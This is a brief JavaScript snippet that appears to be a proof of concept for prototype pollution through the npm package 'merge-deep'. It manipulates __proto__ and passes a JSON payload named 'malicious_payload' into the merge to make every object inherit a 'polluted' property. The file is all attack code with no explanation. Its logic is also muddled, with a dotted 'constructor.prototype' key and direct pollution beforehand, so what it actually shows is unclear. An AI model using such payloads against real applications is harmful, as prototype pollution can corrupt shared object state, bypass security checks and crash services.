var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const merge = require('merge-deep');
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
merge(obj, JSON.parse(malicious_payload));
console.log({}.polluted);